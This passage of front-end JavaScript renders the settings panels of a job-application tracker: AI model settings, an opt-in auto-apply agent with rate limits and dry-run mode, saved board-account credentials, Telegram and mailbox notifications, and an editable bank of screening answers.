          <span>Enable cover-letter drafting</span>
        </label>
        <p class="field-help">
          Untick if you don't want to run a model — the app hides every drafting affordance
          and never calls an LLM for this account.
        </p>
      </div>

      <div class="mt-5">
        <label class="field-label" for="l-base">Base URL</label>
        <input id="l-base" class="field-input mono" value="${escapeHtml(s.base_url || "")}"
          placeholder="${escapeHtml(inst.base_url || "http://localhost:11434/v1")}" />
      </div>

      <div class="mt-4">
        <label class="field-label" for="l-model">Model</label>
        <input id="l-model" class="field-input mono" value="${escapeHtml(s.model || "")}"
          placeholder="${escapeHtml(inst.model || "llama3.1")}" />
      </div>

      <div class="mt-4">
        <label class="field-label" for="l-signature">Cover-letter signature</label>
        <textarea id="l-signature" class="field-input" rows="5"
          placeholder="Sincerely,\nAda Byte">${escapeHtml(s.cover_letter_signature || "")}</textarea>
        <p class="field-help">This text is appended exactly to every newly generated cover letter.</p>
      </div>

      <div class="mt-4">
        <label class="field-label" for="l-key">API key ${secretsOff ? "— unavailable on this instance" : "— write-only"}</label>
        <input id="l-key" type="password" class="field-input mono" autocomplete="off"
          placeholder="${secretsOff ? "operator hasn't enabled per-tenant keys" : "leave blank to keep the saved key"}"
          ${secretsOff ? "disabled" : ""} />
        <label class="source-row mt-2 ${s.has_api_key && !secretsOff ? "" : "hidden"}">
          <input id="l-clear" type="checkbox" /> <span>Remove the saved key</span>
        </label>
        <p class="field-help">${escapeHtml(keyNote)}</p>
      </div>

      <div class="mt-4 rounded-md border border-rule px-3 py-2 field-help">
        Instance default — ${inst.base_url ? escapeHtml(inst.base_url) : "no URL"} ·
        ${inst.model ? escapeHtml(inst.model) : "no model"} ·
        ${inst.has_api_key ? "key set" : "no key"}
      </div>

      <div class="mt-7 flex items-center justify-end gap-2 border-t border-rule pt-4">
        <button class="btn btn-ghost" data-act="cancel">Cancel</button>
        <button class="btn btn-primary" data-act="save">Save AI settings</button>
      </div>
    </article>`;
}

function wireLlm() {
  contentEl.querySelector('[data-act="cancel"]').onclick = () =>
    state.current ? openApp(state.current) : renderEmpty();
  contentEl.querySelector('[data-act="save"]').onclick = async () => {
    const body = {
      base_url: $("#l-base").value.trim(),
      model: $("#l-model").value.trim(),
      cover_letter_signature: $("#l-signature").value.trim(),
      cover_letters_enabled: $("#l-enabled").checked,
    };
    // api_key is omitted unless the user typed a new one or asked to clear it —
    // mirrors the server's "omitted = leave alone" semantics.
    const keyEl = $("#l-key");
    const clearEl = $("#l-clear");
    if (keyEl && keyEl.value) body.api_key = keyEl.value;
    else if (clearEl && clearEl.checked) body.api_key = "";
    try {
      const r = await api("PUT", "/api/llm-settings", body);
      state.coverLettersEnabled = r.cover_letters_enabled !== false;
      toast("AI settings saved.");
    } catch (e) {
      toast(e.message);
    }
  };
}

// Settings · AI tab.
async function loadLlmTab(body, gen = settingsGen) {
  const s = await api("GET", "/api/llm-settings");
  if (settingsSuperseded(gen)) return;
  state.coverLettersEnabled = s.cover_letters_enabled !== false;
  body.innerHTML = llmMarkup(s);
  wireLlm();
}

// ---- Agent settings panel --------------------------------------------------
// What the agent may do, and the standing facts it answers forms with. The agent is
// opt-in and spends the tenant's model budget unattended, so the switch is explicit.

function agentMarkup(s, events) {
  const rows = (events || []).map((e) => {
    const d = e.detail || {};
    const what = e.kind === "verdict"
      ? `<span class="link-status ${d.decision === "proceed" ? "ok" : "bad"}">${escapeHtml(d.decision || "?")}</span> ${escapeHtml(d.rationale || "")}`
      : e.kind === "account_created"
        ? `<span class="link-status ok">account created</span> ${escapeHtml(d.note || d.host || "")}`
        : `<span class="link-status bad">${escapeHtml(e.kind === "account_not_created" ? "no account created" : e.kind)}</span> ${escapeHtml(d.reason || d.note || "")}`;
    const who = e.application_name
      ? `<button class="btn btn-ghost btn-xs mono" data-open="${escapeHtml(e.application_name)}" type="button">${escapeHtml(e.application_name)}</button>`
      : "";
    return `<li class="mt-2 text-sm">${who} ${what}
      <span class="text-ink-faint">· ${escapeHtml(new Date(e.created_at).toLocaleString())}</span></li>`;
  }).join("");
  return `
    <article class="sheet">
      <div class="sheet-eyebrow">Agent · auto-apply</div>
      <h2 class="sheet-title">What the agent may do</h2>
      <p class="field-help">
        The agent re-reads each promising posting and forms its own fit verdict, vetoing
        keyword-inflated scores. It uses the AI endpoint from Settings · AI.
        ${s.worker_running ? "" : "<strong>No agent worker is running on this instance</strong> — settings save, but nothing happens unattended until the operator starts the agent container. You can still evaluate a lead by hand from its sheet."}
      </p>
      <p class="field-help" id="worker-seen">${workerSeenLine(s)}</p>

      <div class="mt-5">
        ${s.allowed === false ? `<p class="packet-flag mb-2">Auto-apply isn't enabled for this account. The operator of this instance adds accounts to its allowlist; until then the standing answers below still save and you can evaluate a lead by hand from its sheet.</p>` : ""}
        <label class="source-row">
          <input id="a-enabled" type="checkbox"${s.enabled ? " checked" : ""}${s.allowed === false ? " disabled" : ""} />
          <span>Enable the agent for this account</span>
        </label>
        <p class="field-help">Off by default. On, the worker judges your best unjudged leads on every pass.</p>
      </div>

      <div class="mt-4">
        <label class="source-row">
          <input id="a-dry" type="checkbox"${s.dry_run === false ? "" : " checked"} />
          <span>Dry run only — fill the form and screenshot it, never click Submit for me</span>
        </label>
        <p class="field-help">${s.browser_available
          ? "A browser container is available. With this on (the default) the agent fills every form and moos you to click Apply; untick it to let <strong>Submit</strong> on a packet actually apply."
          : "No browser container on this instance: packets are prepared and you apply via <strong>Copy answers and open the posting</strong>."}</p>
      </div>

      <div class="mt-4">
        <label class="source-row">
          <input id="a-long" type="checkbox"${s.long_tail ? " checked" : ""} />
          <span>Let the browser fill forms on ATSs it doesn't know (the long tail)</span>
        </label>
        <p class="field-help">Greenhouse, Lever and Ashby forms are understood. Anything else is filled by field label alone, and the agent refuses to click if a required field can't be mapped. Off by default.</p>
      </div>

      <div class="mt-4">
        <label class="source-row">
          <input id="a-li-easy" type="checkbox"${s.linkedin_easy ? " checked" : ""} aria-describedby="a-li-easy-help" />
          <span>Apply through LinkedIn Easy Apply, signed in as me</span>
        </label>
        <p class="field-help" id="a-li-easy-help">Off by default. On, LinkedIn postings that only take Easy Apply are staged (they were skipped before) and the browser fills LinkedIn's own dialog using the LinkedIn account saved under Board accounts. <strong>This automates your personal LinkedIn account, which LinkedIn's terms do not allow</strong>; an account it notices can be restricted, and it is the same account your LinkedIn search runs on. It sends at most ten a day, never follows the company for you, and stops at any sign-in or security check.</p>
      </div>

      <div class="mt-4">
        <label class="source-row">
          <input id="a-jev" type="checkbox"${s.jev_classify ? " checked" : ""} aria-describedby="a-jev-help" />
          <span>Score new listings with Jev instead of keyword matching</span>
        </label>
        <p class="field-help" id="a-jev-help">Off by default. On, the poller asks TypeSafe's Jev model whether each new listing's own work is the kind your keywords describe — so a sales role at an AI company no longer matches on "AI", and a "Data Engineer" posting matches without naming a keyword — and that fit is held to the discovery minimum fit score. Each new listing's title and description are sent to TypeSafe. It works only when the operator has set <code>TYPESAFE_API_KEY</code> on the poller; without one, or if the service fails, keyword matching decides as before.</p>
      </div>

      <div class="mt-4">
        <label class="source-row">
          <input id="a-create-accounts" type="checkbox"${s.create_accounts ? " checked" : ""} aria-describedby="a-create-accounts-help" />
          <span>Create a candidate account when an application needs one</span>
        </label>
        <p class="field-help" id="a-create-accounts-help">Off by default. Some systems (Workday, Oracle Taleo, UKG, haystack.cv) only take applications from a signed-in candidate. On, when a run stops at one and no account is saved for it, the agent <strong>registers a real account in your name</strong> with your application email and a strong generated password, confirms it from your mailbox, signs in with it to prove it works, and only then saves it under Board accounts — for that one employer. Each account created is listed in the agent's activity. It never gets past a captcha, and if an account already exists it tells you instead of resetting it.</p>
      </div>

      <div class="mt-4 agent-grid">
        <div>
          <label class="field-label" for="a-min">Min fit score</label>
          <input id="a-min" class="field-input mono" type="number" min="0" max="100" value="${escapeHtml(String(s.min_fit_score ?? 70))}" />
          <p class="field-help">Below this, no tokens are spent.</p>
        </div>
        <div>
          <label class="field-label" for="a-run">Max per pass</label>
          <input id="a-run" class="field-input mono" type="number" min="1" max="50" value="${escapeHtml(String(s.max_per_run ?? 5))}" />
        </div>
        <div>
          <label class="field-label" for="a-day">Max per day</label>
          <input id="a-day" class="field-input mono" type="number" min="1" max="500" value="${escapeHtml(String(s.max_per_day ?? 20))}" />
        </div>
      </div>

      <h3 class="mt-7">Standing answers</h3>
      <p class="field-help">Facts the agent states as-is. They never go through the model.</p>
      <div class="mt-3">
        <label class="field-label" for="a-auth">Work authorization</label>
        <input id="a-auth" class="field-input" value="${escapeHtml(s.work_authorization || "")}" placeholder="e.g. US citizen" />
      </div>
      <div class="mt-3">
        <label class="source-row">
          <input id="a-sponsor" type="checkbox"${s.needs_sponsorship ? " checked" : ""} />
          <span>I need visa sponsorship</span>
        </label>
        <label class="source-row">
          <input id="a-clearance" type="checkbox"${s.clearance_ok ? " checked" : ""} />
          <span>I hold, or can obtain, a security clearance</span>
        </label>
        <p class="field-help">Postings that require a clearance you can't get, or refuse sponsorship you need, are skipped before the model is consulted.</p>
      </div>
      <div class="mt-3 grid grid-cols-2 gap-4">
        <div>
          <label class="field-label" for="a-salary">Salary expectation</label>
          <input id="a-salary" class="field-input" value="${escapeHtml(s.salary_expectation || "")}" placeholder="e.g. 140000" inputmode="decimal" />
          <p class="field-help">One plain figure. With a period and a currency stated, a form asking per month or per hour in the same currency gets it converted; one asking in another currency is still yours to answer.</p>
        </div>
        <div>
          <label class="field-label" for="a-salary-period">Salary period</label>
          <select id="a-salary-period" class="field-input">
            <option value=""${s.salary_period ? "" : " selected"}>— as the figure says —</option>
            <option value="annual"${s.salary_period === "annual" ? " selected" : ""}>per year</option>
            <option value="monthly"${s.salary_period === "monthly" ? " selected" : ""}>per month</option>
            <option value="hourly"${s.salary_period === "hourly" ? " selected" : ""}>per hour</option>
          </select>
          <label class="field-label mt-3" for="a-salary-currency">Salary currency</label>
          <input id="a-salary-currency" class="field-input mono" value="${escapeHtml(s.salary_currency || "")}" placeholder="USD" maxlength="8" autocapitalize="characters" />
        </div>
        <div>
          <label class="field-label" for="a-phone">Phone</label>
          <input id="a-phone" class="field-input" value="${escapeHtml(s.phone || "")}" autocomplete="tel" />
        </div>
        <div>
          <label class="field-label" for="a-country">Country</label>
          <input id="a-country" class="field-input" value="${escapeHtml(s.country || "")}" autocomplete="country-name" placeholder="e.g. United States" />
          <p class="field-help">As a form's country picker lists it. Blank infers it from your résumé's location.</p>
        </div>
      </div>

      <h3 class="mt-8" id="board-accounts-heading">Board accounts</h3>
      <p class="field-help">
        Some applicant-tracking systems only take an application from a signed-in candidate
        account — <strong>SAP SuccessFactors</strong> (Kiewit and many large employers) asks for
        the account you created on their careers site the first time you applied. Save that
        sign-in here and the browser signs in with it when Apply leads there, then fills and
        submits the application as usual. The password is write-only and stored encrypted.
        The browser never creates accounts. A <strong>LinkedIn</strong> account saved here
        (site <span class="mono">linkedin.com</span>, with its password) turns on the
        <strong>LinkedIn</strong> source under Criteria: the browser signs in as you, keeps
        the session, and the poller searches with it — you may have to tap Yes in the
        LinkedIn app the first time, and the moo will say so. A <strong>Handshake</strong>
        account (site <span class="mono">joinhandshake.com</span>, with the
        <strong>school email</strong> your campus signs in with and its password) turns on
        the <strong>Handshake</strong> source the same way.
        <strong>Read this before saving a Handshake one:</strong> that password is your
        <strong>school sign-in</strong> — the same one that opens your campus email,
        registrar record and financial-aid portal, not a job-board password. It is stored
        encrypted like every other credential here, but it is a campus identity, and most
        university policies forbid handing those to third-party software. Handshake also
        forbids automated access. Only a school whose sign-in is a plain username and
        password form can be driven; a school using Microsoft, Okta, Shibboleth or Google,
        or requiring a second factor, is refused with a message saying so.
      </p>
      <ul id="board-accounts" class="agent-log" aria-labelledby="board-accounts-heading">
        ${(s.board_accounts || []).length ? s.board_accounts.map((a) => `
          <li class="mt-2 text-sm flex items-center gap-2 flex-wrap">
            <span class="mono">${escapeHtml(a.host)}</span>
            <span class="text-ink-faint">· ${escapeHtml(a.username)}${a.has_password ? "" : " · no password saved"}${boardSessionLine(a)}</span>
            ${a.keeps_session ? `<button class="btn btn-ghost btn-sm" type="button" data-renew-account="${escapeHtml(a.host)}" aria-label="Sign in to ${escapeHtml(a.host)} now"${a.renew_requested_at ? " disabled" : ""}>Sign in now</button>` : ""}
            <button class="btn btn-ghost btn-sm" type="button" data-forget-account="${escapeHtml(a.host)}" aria-label="Forget the account at ${escapeHtml(a.host)}">Forget</button>
          </li>`).join("") : '<li class="mt-2 text-sm field-help">None saved.</li>'}
      </ul>
      <div class="mt-3 agent-grid">
        <div>
          <label class="field-label" for="ba-host">Site</label>
          <input id="ba-host" class="field-input mono" placeholder="career4.successfactors.com" autocomplete="off" />
          <p class="field-help">The host of the sign-in page Apply leads to.</p>
        </div>
        <div>
          <label class="field-label" for="ba-user">Username</label>
          <input id="ba-user" class="field-input" placeholder="you@example.com" autocomplete="off" />
        </div>
        <div>
          <label class="field-label" for="ba-pass">Password — write-only</label>
          <input id="ba-pass" type="password" class="field-input mono" autocomplete="new-password" />
        </div>
      </div>
      <div class="mt-2 flex justify-end">
        <button class="btn btn-ghost" type="button" data-act="save-account">Save board account</button>
      </div>

      <div class="mt-7 flex items-center justify-end gap-2 border-t border-rule pt-4">
        <button class="btn btn-ghost" data-act="cancel">Cancel</button>
        <button class="btn btn-primary" data-act="save">Save agent settings</button>
      </div>

      <h3 class="mt-8">Agent log</h3>
      <p class="field-help">Every verdict the agent reached, newest first. A skip is recorded with its reason.</p>
      <ul id="agent-log" class="agent-log">${rows || '<li class="mt-2 text-sm field-help">Nothing yet.</li>'}</ul>
    </article>`;
}

function wireAgent() {
  contentEl.querySelector('[data-act="cancel"]').onclick = () =>
    state.current ? openApp(state.current) : renderEmpty();
  contentEl.querySelector('[data-act="save"]').onclick = async () => {
    const body = {
      enabled: $("#a-enabled").checked,
      dry_run: $("#a-dry").checked,
      long_tail: $("#a-long").checked,
      linkedin_easy: $("#a-li-easy").checked,
      jev_classify: $("#a-jev").checked,
      create_accounts: $("#a-create-accounts").checked,
      min_fit_score: Number($("#a-min").value),
      max_per_run: Number($("#a-run").value),
      max_per_day: Number($("#a-day").value),
      work_authorization: $("#a-auth").value.trim(),
      needs_sponsorship: $("#a-sponsor").checked,
      clearance_ok: $("#a-clearance").checked,
      salary_expectation: $("#a-salary").value.trim(),
      salary_period: $("#a-salary-period").value,
      salary_currency: $("#a-salary-currency").value.trim().toUpperCase(),
      phone: $("#a-phone").value.trim(),
      country: $("#a-country").value.trim(),
    };
    try {
      const r = await api("PUT", "/api/agent-settings", body);
      state.agentEnabled = r.enabled === true;
      // Flipping dry-run off queues every Ready packet whose dry run was clean (#185).
      const n = (r.requeued || []).length;
      toast(n ? `Agent settings saved · ${n} clean dry run${n === 1 ? "" : "s"} queued for real submission.` : "Agent settings saved.");
    } catch (e) {
      toast(e.message);
    }
  };
  // Board accounts (#216): save one, forget one; the list re-renders from the server.
  const saveAccount = contentEl.querySelector('[data-act="save-account"]');
  if (saveAccount) saveAccount.onclick = async () => {
    const body = { host: $("#ba-host").value.trim(), username: $("#ba-user").value.trim() };
    if ($("#ba-pass").value) body.password = $("#ba-pass").value;
    try {
      await api("PUT", "/api/board-accounts", body);
      toast(`Board account for ${body.host} saved.`);
      openSettings("agent");
    } catch (e) {
      toast(e.message);
    }
  };
  contentEl.querySelectorAll("[data-forget-account]").forEach((b) => {
    b.onclick = async () => {
      try {
        await api("DELETE", `/api/board-accounts/${encodeURIComponent(b.dataset.forgetAccount)}`);
        toast(`Forgot the account at ${b.dataset.forgetAccount}.`);
        openSettings("agent");
      } catch (e) {
        toast(e.message);
      }
    };
  });
  // Sign in now: the agent renews the kept session on its next tick, while the person has
  // their phone for LinkedIn's tap or the mailed PIN — not on its own six-hour clock.
  contentEl.querySelectorAll("[data-renew-account]").forEach((b) => {
    b.onclick = async () => {
      b.disabled = true;
      try {
        await api("POST", `/api/board-accounts/${encodeURIComponent(b.dataset.renewAccount)}/renew`);
        toast(`Sign-in to ${b.dataset.renewAccount} requested — the agent starts within a minute; have the app or mailbox ready, the moo says when.`);
        openSettings("agent");
      } catch (e) {
        b.disabled = false;
        toast(e.message);
      }
    };
  });
  contentEl.querySelectorAll("[data-open]").forEach((b) => {
    b.onclick = () => openApp(b.dataset.open);
  });
}

// The kept session on a signed-in source's account: kept until when, or not kept — and a
// Sign in now the worker has not taken yet. Nothing for an account that keeps no session.
function boardSessionLine(a) {
  if (!a.keeps_session) return "";
  if (a.renew_requested_at) return " · sign-in requested, the agent is on it";
  if (!a.session_expires_at) return " · no session kept";
  const until = new Date(a.session_expires_at);
  return until.getTime() <= Date.now() ? " · session expired" : ` · session kept until ${escapeHtml(until.toLocaleDateString())}`;
}

// "Worker last seen 12 minutes ago" — a wedged worker is visible, not merely absent (#184).
function workerSeenLine(s) {
  if (!s.worker_last_seen) return s.worker_running ? "" : "No worker has ever checked in.";
  const seen = new Date(s.worker_last_seen);
  const mins = Math.max(0, Math.round((Date.now() - seen.getTime()) / 60000));
  const ago = mins < 1 ? "just now" : mins < 60 ? `${mins} minute${mins === 1 ? "" : "s"} ago` : `${Math.round(mins / 60)} hour${Math.round(mins / 60) === 1 ? "" : "s"} ago`;
  const stale = mins >= 3;
  return `Worker last seen ${ago} (${escapeHtml(seen.toLocaleString())})${stale ? " — <strong>silent for longer than its heartbeat allows; it may be wedged.</strong>" : "."}`;
}

// Settings · Agent tab.
async function loadAgentTab(body, gen = settingsGen) {
  const [s, events, accounts] = await Promise.all([
    api("GET", "/api/agent-settings"),
    api("GET", "/api/agent-events?limit=50").catch(() => []),
    api("GET", "/api/board-accounts").catch(() => []),
  ]);
  if (settingsSuperseded(gen)) return;
  s.board_accounts = Array.isArray(accounts) ? accounts : [];
  state.agentEnabled = s.enabled === true;
  state.browserAvailable = s.browser_available === true;
  state.longTail = s.long_tail === true;
  state.linkedinEasy = s.linkedin_easy === true;
  body.innerHTML = agentMarkup(s, Array.isArray(events) ? events : []);
  wireAgent();
}

// ---- Notifications panel ---------------------------------------------------
// The moo: a Telegram message when the agent has a packet ready for you to submit.
// Per account — your own bot, your own chat; the token is write-only and encrypted.

function notificationsMarkup(s) {
  const secretsOff = !s.secrets_available;
  const tokenNote = secretsOff
    ? "Set APPLYTRACK_SECRETS_KEY on the server to store a bot token."
    : s.has_bot_token
    ? "A token is saved (hidden). Enter a new one to replace it, or tick the box to remove it."
    : "No token saved.";
  return `
    <article class="sheet">
      <div class="sheet-eyebrow">Notifications · Telegram</div>
      <h2 class="sheet-title">🐮 Moo me when a packet is ready</h2>
      <p class="field-help">
        When the agent has prepared an application and parked it in Ready, it sends one
        Telegram message with a link straight to it. Create a bot with
        <span class="mono">@BotFather</span>, send your bot a message, then get your chat id
        from <span class="mono">https://api.telegram.org/bot&lt;token&gt;/getUpdates</span>.
      </p>

      <div class="mt-5">
        <label class="source-row">
          <input id="n-enabled" type="checkbox"${s.telegram_enabled ? " checked" : ""} />
          <span>Send a Telegram message when a packet is ready</span>
        </label>
      </div>

      <div class="mt-4">
        <label class="field-label" for="n-chat">Chat id</label>
        <input id="n-chat" class="field-input mono" value="${escapeHtml(s.telegram_chat_id || "")}" placeholder="123456789 or @channel" autocomplete="off" />
      </div>

      <div class="mt-4">
        <label class="field-label" for="n-token">Bot token ${secretsOff ? "— unavailable on this instance" : "— write-only"}</label>
        <input id="n-token" type="password" class="field-input mono" autocomplete="off"
          placeholder="${secretsOff ? "operator hasn't enabled per-tenant secrets" : "leave blank to keep the saved token"}"
          ${secretsOff ? "disabled" : ""} />
        <label class="source-row mt-2 ${s.has_bot_token && !secretsOff ? "" : "hidden"}">
          <input id="n-clear" type="checkbox" /> <span>Remove the saved token</span>
        </label>
        <p class="field-help">${escapeHtml(tokenNote)}</p>
      </div>

      <h3 class="mt-8">Mailbox · security codes</h3>
      <p class="field-help">
        Greenhouse answers the agent's Submit with a security code sent to <em>your</em> email
        and asks for it on the form. With your mailbox here (IMAP, read-only) the parked run
        reads the code itself and finishes without you. For Gmail: host
        <span class="mono">imap.gmail.com</span>, port <span class="mono">993</span>, your
        address, and an <strong>App Password</strong> (Google Account → Security → 2-Step
        Verification → App passwords), not your login password.
      </p>
      <div class="mt-3">
        <label class="source-row">
          <input id="m-enabled" type="checkbox"${s.mailbox_enabled ? " checked" : ""} />
          <span>Read security codes from my mailbox</span>
        </label>
      </div>
      <div class="mt-3 grid grid-cols-2 gap-4">
        <div>
          <label class="field-label" for="m-host">IMAP host</label>
          <input id="m-host" class="field-input mono" value="${escapeHtml(s.mailbox_host || "")}" placeholder="imap.gmail.com" autocomplete="off" />
        </div>
        <div>
          <label class="field-label" for="m-port">Port</label>
          <input id="m-port" class="field-input mono" type="number" min="1" max="65535" value="${escapeHtml(String(s.mailbox_port || 993))}" />
        </div>
        <div>
          <label class="field-label" for="m-user">Username</label>
          <input id="m-user" class="field-input mono" value="${escapeHtml(s.mailbox_username || "")}" placeholder="you@gmail.com" autocomplete="off" />
        </div>
        <div>
          <label class="field-label" for="m-pass">App password ${secretsOff ? "— unavailable on this instance" : "— write-only"}</label>
          <input id="m-pass" type="password" class="field-input mono" autocomplete="off"
            placeholder="${s.has_mailbox_password ? "leave blank to keep the saved password" : "not saved yet"}" ${secretsOff ? "disabled" : ""} />
          <label class="source-row mt-2 ${s.has_mailbox_password && !secretsOff ? "" : "hidden"}">
            <input id="m-clear" type="checkbox" /> <span>Remove the saved password</span>
          </label>
        </div>
      </div>

      <div class="mt-7 flex items-center justify-end gap-2 border-t border-rule pt-4">
        <button class="btn btn-ghost" data-act="cancel">Cancel</button>
        <button class="btn btn-ghost" data-act="mailbox-test" ${s.has_mailbox_password ? "" : "disabled"}>Test mailbox</button>
        <button class="btn btn-ghost" data-act="test" ${s.has_bot_token ? "" : "disabled"}>Send test message</button>
        <button class="btn btn-primary" data-act="save">Save notifications</button>
      </div>
    </article>`;
}

function wireNotifications() {
  contentEl.querySelector('[data-act="cancel"]').onclick = () =>
    state.current ? openApp(state.current) : renderEmpty();
  contentEl.querySelector('[data-act="save"]').onclick = async () => {
    const body = {
      telegram_enabled: $("#n-enabled").checked,
      telegram_chat_id: $("#n-chat").value.trim(),
    };
    // The token is omitted unless the user typed a new one or asked to clear it.
    const tokenEl = $("#n-token");
    const clearEl = $("#n-clear");
    if (tokenEl && tokenEl.value) body.telegram_bot_token = tokenEl.value.trim();
    else if (clearEl && clearEl.checked) body.telegram_bot_token = "";
    body.mailbox_enabled = $("#m-enabled").checked;
    body.mailbox_host = $("#m-host").value.trim();
    body.mailbox_port = Number($("#m-port").value) || 993;
    body.mailbox_username = $("#m-user").value.trim();
    const passEl = $("#m-pass");
    const passClear = $("#m-clear");
    if (passEl && passEl.value) body.mailbox_password = passEl.value.trim();
    else if (passClear && passClear.checked) body.mailbox_password = "";
    try {
      await api("PUT", "/api/notifications", body);
      toast("Notification settings saved.");
      openSettings("notifications");
    } catch (e) {
      toast(e.message);
    }
  };
  const mailboxTestEl = contentEl.querySelector('[data-act="mailbox-test"]');
  mailboxTestEl.onclick = async () => {
    mailboxTestEl.disabled = true;
    try {
      const r = await api("POST", "/api/notifications/mailbox/test");
      toast(`Mailbox opened — ${r.messages} message${r.messages === 1 ? "" : "s"} in the inbox.`);
    } catch (e) {
      toast(e.message);
    } finally {
      mailboxTestEl.disabled = false;
    }
  };
  const testEl = contentEl.querySelector('[data-act="test"]');
  testEl.onclick = async () => {
    testEl.disabled = true;
    try {
      await api("POST", "/api/notifications/test");
      toast("🐮 moo sent — check Telegram.");
    } catch (e) {
      toast(e.message);
    } finally {
      testEl.disabled = false;
    }
  };
}

// ---- Answers panel ----------------------------------------------------------
// The answer bank: every screening question the agent has met on a form, with the
// answer it gave. Edit one and the agent says that from now on; clear it to hand the
// question back to the drafter; forget it and it comes back the next time a form asks.

function answerControl(e, i) {
  const id = `ans-${i}`;
  if (e.options && e.options.length && e.type === "select") {
    const current = (e.answer || "").trim().toLowerCase();
    return `<select id="${id}" class="field-input" data-key="${escapeHtml(e.key)}">
      <option value=""${current ? "" : " selected"}>— let the agent decide —</option>
      ${e.options.map((o) => `<option value="${escapeHtml(o)}"${o.trim().toLowerCase() === current ? " selected" : ""}>${escapeHtml(o)}</option>`).join("")}
    </select>`;
  }
  const rows = e.type === "textarea" ? 4 : 1;
  return `<textarea id="${id}" class="field-input" rows="${rows}" data-key="${escapeHtml(e.key)}"
    placeholder="${e.answer ? "" : "No answer yet — the agent left this one to you"}">${escapeHtml(e.answer || "")}</textarea>`;
}

function answersMarkup(entries) {
  const rows = entries.map((e, i) => `
    <div class="answer-row mt-5" data-answer-key="${escapeHtml(e.key)}">
      <label class="field-label" for="ans-${i}">${escapeHtml(e.label)}${e.help ? ` <span class="text-ink-faint">(${escapeHtml(e.help)})</span>` : ""}</label>
      <p class="field-help">
        <span class="link-status ${e.source === "human" ? "ok" : ""}">${e.source === "human" ? "Your answer" : "Agent's answer"}</span>
        ${e.times_seen ? `· asked on ${e.times_seen} form${e.times_seen === 1 ? "" : "s"} · last ${escapeHtml(new Date(e.last_seen_at).toLocaleDateString())}` : "· not asked on a form yet"}
        ${e.first_application ? ` · first on <a href="#app=${encodeURIComponent(e.first_application)}">${escapeHtml(e.first_application.replace(/\.md$/, ""))}</a>` : ""}
        ${e.options && e.options.length && e.type !== "select" ? ` · options: ${escapeHtml(e.options.join(", "))}` : ""}
      </p>
      ${answerControl(e, i)}
      <div class="mt-2 flex flex-wrap gap-2">
        <button class="btn btn-primary btn-xs" type="button" data-ans-save="${escapeHtml(e.key)}" aria-label="Save your answer to ${escapeHtml(e.label)}">Save as my answer</button>
        ${e.source === "human" ? `<button class="btn btn-ghost btn-xs" type="button" data-ans-apply="${escapeHtml(e.key)}" aria-label="Apply your answer to ${escapeHtml(e.label)} to every Ready packet">Apply to Ready packets</button>` : ""}
        ${e.source === "human" ? `<button class="btn btn-ghost btn-xs" type="button" data-ans-reset="${escapeHtml(e.key)}" aria-label="Let the agent answer ${escapeHtml(e.label)} again">Let the agent answer</button>` : ""}
        <button class="btn btn-ghost btn-xs" type="button" data-ans-forget="${escapeHtml(e.key)}" aria-label="Forget ${escapeHtml(e.label)}">Forget</button>
      </div>
    </div>`).join("");
  return `
    <article class="sheet">
      <div class="sheet-eyebrow">Answers</div>
      <h2 class="sheet-title">What the agent says on application forms</h2>
      <p class="field-help">
        Every screening question the agent has met, as the form asked it, with the answer it
        gave. Change one and <strong>Save as my answer</strong>: from then on the agent uses your
        words on every form that asks the same question, no model involved — and
        <strong>Apply to Ready packets</strong> writes it into the packets already built. Your first and
        last name are always listed: the agent splits them from your résumé's name, and if a form
        should see something else, set them here once. Email and the résumé come from your profile;
        salary, work authorization and phone defaults live in Settings · Agent and show up here as
        the forms ask for them.
      </p>
      ${entries.length ? rows : `<div class="board-empty field-help mt-5">No questions yet — they appear here as the agent prepares packets.</div>`}
    </article>`;
}

function wireAnswers(body, gen) {
  const reload = () => loadAnswersTab(body, gen);
  body.querySelectorAll("[data-ans-save]").forEach((btn) => {
    btn.onclick = async () => {
      const key = btn.dataset.ansSave;
      const control = body.querySelector(`[data-key="${CSS.escape(key)}"]`);
      const answer = (control ? control.value : "").trim();
      if (!answer) return toast("Type an answer first, or use Let the agent answer.");
      try {
        await api("PUT", `/api/answers/${encodeURIComponent(key)}`, { answer });
        toast("Saved — the agent will use your answer from now on.");
        await reload();
      } catch (e) {
        toast(e.message);
      }
    };
  });
  // Write the saved answer into every Ready packet that asks this question — no model,
  // no rebuild (#189).
  body.querySelectorAll("[data-ans-apply]").forEach((btn) => {
    btn.onclick = async () => {
      btn.disabled = true;
      try {
        const r = await api("POST", `/api/answers/${encodeURIComponent(btn.dataset.ansApply)}/apply`);
        toast(r.updated ? `Updated ${r.updated} Ready packet${r.updated === 1 ? "" : "s"}.` : "No Ready packet asks this question with a different answer.");
      } catch (e) {
        toast(e.message);
      } finally {
        btn.disabled = false;
      }
    };
  });
  body.querySelectorAll("[data-ans-reset]").forEach((btn) => {
    btn.onclick = async () => {
      try {
        await api("PUT", `/api/answers/${encodeURIComponent(btn.dataset.ansReset)}`, { answer: "" });
        toast("The agent will draft this one again.");
        await reload();
      } catch (e) {
        toast(e.message);
      }
    };
  });
  body.querySelectorAll("[data-ans-forget]").forEach((btn) => {
    btn.onclick = async () => {
      try {
        await api("DELETE", `/api/answers/${encodeURIComponent(btn.dataset.ansForget)}`);
        toast("Forgotten — it comes back the next time a form asks.");
        await reload();
      } catch (e) {
        toast(e.message);
      }
    };
  });
}

// Settings · Answers tab.
async function loadAnswersTab(body, gen = settingsGen) {
  const entries = await api("GET", "/api/answers");
  if (settingsSuperseded(gen)) return;
  body.innerHTML = answersMarkup(entries);
  wireAnswers(body, gen);
}

// Settings · Notifications tab.
async function loadNotificationsTab(body, gen = settingsGen) {
  const s = await api("GET", "/api/notifications");
  if (settingsSuperseded(gen)) return;
  body.innerHTML = notificationsMarkup(s);
  wireNotifications();
}

// ---- Boot + refresh -------------------------------------------------------

async function refresh() {
  const list = await api.getConditional("/api/apps", state.appsEtag);
  if (!list.modified) {
    // What is stuck can change with the list unchanged — a retry that came back clean writes
    // evidence, not the application — and the "In Errors" tag must follow it (#322).
    const before = [...errorNames()].sort().join("\n");
    await loadErrors();
    if ([...errorNames()].sort().join("\n") !== before) { renderPipeline(); renderSidebar(); }
    return false;
  }

  // Stats are derived from the same applications table revision, so an unchanged
  // list means they are unchanged too. Fetch them only after an ETag miss.
  const stats = await api("GET", "/api/stats");
  await loadErrors();
  state.apps = list.data;
  state.stats = stats;
  state.appsEtag = list.etag;
  renderPipeline();
  renderSidebar();
  return true;
}

searchEl.addEventListener("input", () => {
  state.query = searchEl.value;
  // A new search starts unfiltered, on its first page: a "Where" left from the last one
  // hid the very match being looked for.
